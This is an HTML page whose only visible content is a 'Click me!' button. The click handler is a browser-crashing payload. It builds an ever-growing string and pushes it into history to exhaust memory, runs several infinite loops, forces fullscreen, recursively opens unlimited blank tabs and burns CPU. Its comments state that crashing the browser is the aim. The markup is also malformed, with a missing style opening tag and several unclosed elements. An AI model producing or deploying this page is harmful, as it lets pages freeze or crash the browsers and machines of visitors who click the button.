<!DOCTYPE html>
<html>
<head>

    html, body {
      width: 100%;
      height: 100%;
      margin: 0;

  </style>
</head>
<body>
  <button id="button">Click me!</button>
  <script>
    document.getElementById('button').addEventListener('click', function() {
      // Consume memory and crash the browser
      var total = "";
      for (var i = 0; i < 9999999999999; i++) {
        total += i.toString();
        history.pushState(0, 0, total);
      }

      // Create multiple infinite loops
      function loop1() {
        for (let i = 999909; i === i; i *= i) {
          console.log(i);
        }
      }
      loop1();

      function loop2() {
        for (let i = 991; i === i; i *= i) {
          console.log(i);
        }
      }
      loop2();

      function loop3() {
        for (let i = 9999; i === i; i *= i) {
          console.log(i);
        }
      }
      loop3();

      function loop4() {
        for (let i = 999; i === i; i *= i) {
          console.log(i);
        }
      }
      loop4();

      function loop5() {
        for (let i = 9999; i === i; i *= i) {
          console.log(i);
        }
      }
      loop5();

      // Make the window full screen
      document.documentElement.requestFullscreen();

      // Open multiple tabs
      function openTab() {
        window.open('about:blank', '_blank');
        setTimeout(openTab, 0);
      }
      openTab();

      // Create a CPU-intensive task
      function cpuIntensive() {
        var startTime = performance.now();
        while (performance.now() - startTime < 10000) {
          Math.sqrt(Math.random() * 1000000);
        }
      }
      cpuIntensive();
    });
